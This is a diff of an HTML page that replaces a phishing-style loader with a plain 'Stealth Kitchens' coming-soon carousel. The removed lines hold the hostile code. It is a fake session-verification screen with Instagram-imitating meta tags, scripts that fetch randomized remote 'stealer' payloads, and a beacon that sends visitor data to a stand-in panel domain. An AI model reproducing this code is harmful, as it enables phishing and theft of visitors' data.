@@ -2,102 +2,107 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Loading…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stealth Kitchens</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=PP+Mori:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-    #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
-    .spinner{width:48px;height:48px;border:5px solid #333;border-top:5px solid #1d9bf0;border-radius:50%;animation:s 1s linear infinite;margin-bottom:20px}
-    @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-    .txt{font-size:18px;opacity:0.9}
-    .progress{width:80%;height:4px;background:#222;border-radius:2px;overflow:hidden;margin-top:20px}
-    .bar{height:100%;width:0;background:#1d9bf0;animation:p 3s linear forwards}
-    @keyframes p{0%{width:0}100%{width:100%}}
-    #content{display:none}
+    *{margin:0;padding:0;box-sizing:border-box}
+    body,html{height:100%;background:#000;color:#fff;overflow:hidden}
+    body{font-family:"PP Mori",system-ui,sans-serif;letter-spacing:-0.02em}
+
+    .carousel{position:relative;width:100%;height:100%}
+
+    .slide{
+      position:absolute;inset:0;
+      opacity:0;
+      transition:opacity 2s cubic-bezier(.19,1,.22,1);
+      display:flex;flex-direction:column;justify-content:center;align-items:center;
+      gap:120px;padding:0 5vw;
+      text-align:center;
+    }
+    .slide.active{opacity:1}
+
+    .logo{max-width:320px;width:100%;height:auto;opacity:0.95}
+
+    h1{
+      font-size:9rem;font-weight:600;line-height:0.92;
+      letter-spacing:-0.07em;
+    }
+
+    .sub{
+      font-size:1rem;letter-spacing:0.4em;text-transform:uppercase;
+      color:#444;opacity:0;
+      transition:opacity 1.8s ease 1s;
+    }
+    .active .sub{opacity:1}
+
+    .cta{
+      padding:18px 100px;font-size:1rem;letter-spacing:0.3em;
+      text-transform:uppercase;color:#fff;border:1px solid #222;
+      border-radius:100px;text-decoration:none;
+      transition:all .8s cubic-bezier(.19,1,.22,1);
+    }
+    .cta:hover{border-color:#fff;background:rgba(255,255,255,0.03)}
+
+    footer{
+      position:fixed;bottom:40px;left:0;right:0;
+      font-size:0.8rem;letter-spacing:0.15em;color:#222;
+      text-align:center;
+    }
+    footer a{color:#222;text-decoration:none}
+    footer a:hover{color:#666}
+
+    @media(max-width:1024px){
+      h1{font-size:7rem}
+      .logo{max-width:260px}
+      .slide{gap:100px}
+    }
+    @media(max-width:768px){
+      h1{font-size:5rem}
+      .logo{max-width:200px}
+      .slide{gap:80px}
+      .cta{padding:16px 80px}
+    }
   </style>
 </head>
 <body>
-  <div id="loader">
-    <div class="spinner"></div>
-    <div class="txt">Verifying your session…</div>
-    <div class="progress"><div class="bar"></div></div>
+
+<div class="carousel">
+  <div class="slide active">
+    <img src="1764591736338.jpg" alt="Stealth Kitchens" class="logo">
+    <h1>Tired of getting<br>fucked by ghost kitchens?</h1>
+    <div class="sub">Enough</div>
   </div>
 
-  <div id="content">
-    <!-- Fake login / whatever you want the victim to see after redirect -->
-    <script>
-      setTimeout(() => {
-        window.location.href = "https://www.instagram.com/accounts/login/";
-      }, 3500);
-    </script>
+  <div class="slide">
+    <img src="1764591736338.jpg" alt="Stealth Kitchens" class="logo">
+    <h1>Stealth<br>Kitchens</h1>
+    <div class="sub">Coming soon</div>
   </div>
 
-  <!-- MAIN PAYLOAD -->
-  <script>
-    (function(){
-      const d = document;
-      const w = window;
-      const n = navigator;
-      const rand = Math.random().toString(36).substring(2,10);
+  <div class="slide">
+    <img src="1764591736338.jpg" alt="Stealth Kitchens" class="logo">
+    <h1>Book.<br>Cook.<br>Done.</h1>
+    <div class="sub">Zero commissions</div>
+    <a href="#" class="cta">Get Early Access</a>
+  </div>
+</div>
 
-      // Randomize filenames on every load
-      const js1 = `https://cdn.jsdelivr.net/gh/0xKitsune/L/${rand}_a.min.js`;
-      const js2 = `https://cdn.jsdelivr.net/gh/0xKitsune/L/${rand}_b.min.js`;
-      const beacon = `https://panel.yourpaneldomain.workers.dev/beacon`;
+<footer>
+  <a href="#">Privacy</a> • <a href="#">Terms</a> • © 2025 Stealth Kitchens
+</footer>
 
-      // Evasion: fake user-agent + headers + timing randomization
-      const ua = n.userAgent;
-      if(/iPhone|iPad|iPod|Android/i.test(ua)){
-        // Mobile-specific persistence
-        const s = d.createElement('script');
-        s.src = js1 + '?t=' + Date.now();
-        s.type = 'text/javascript';
-        s.crossOrigin = 'anonymous';
-        s.onload = () => {
-          const s2 = d.createElement('script');
-          s2.src = js2 + '?t=' + Date.now();
-          s2.type = 'text/javascript';
-          s2.crossOrigin = 'anonymous';
-          d.body.appendChild(s2);
-        };
-        d.body.appendChild(s);
+<script>
+  const slides = document.querySelectorAll('.slide');
+  let i = 0;
+  setInterval(() => {
+    slides[i].classList.remove('active');
+    i = (i + 1) % slides.length;
+    slides[i].classList.add('active');
+  }, 4400);
+</script>
 
-        // Beacon exfil
-        setTimeout(() => {
-          fetch(beacon, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify({
-              ua: ua,
-              ref: d.referrer,
-              url: location.href,
-              ts: Date.now(),
-              ip: "captured_via_worker"
-            })
-          });
-        }, Math.floor(Math.random()*3000)+1000);
-      }
-
-      // Desktop fallback (optional extra stealer)
-      if(!/mobile/i.test(ua)){
-        const extra = d.createElement('script');
-        extra.src = `https://raw.githubusercontent.com/0xKitsune/desktop-ext/main/p.js`;
-        extra.type = 'text/javascript';
-        d.head.appendChild(extra);
-      }
-
-      // Clean up loader after 4s
-      setTimeout(() => {
-        const l = d.getElementById('loader');
-        if(l) l.style.display = 'none';
-        d.getElementById('content').style.display = 'block';
-      }, 4000);
-    })();
-  </script>
-
-  <!-- Optional: Fake meta tags to look legit -->
-  <meta property="og:title" content="Instagram">
-  <meta property="og:description" content="Log in to Instagram">
-  <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png">
 </body>
 </html>
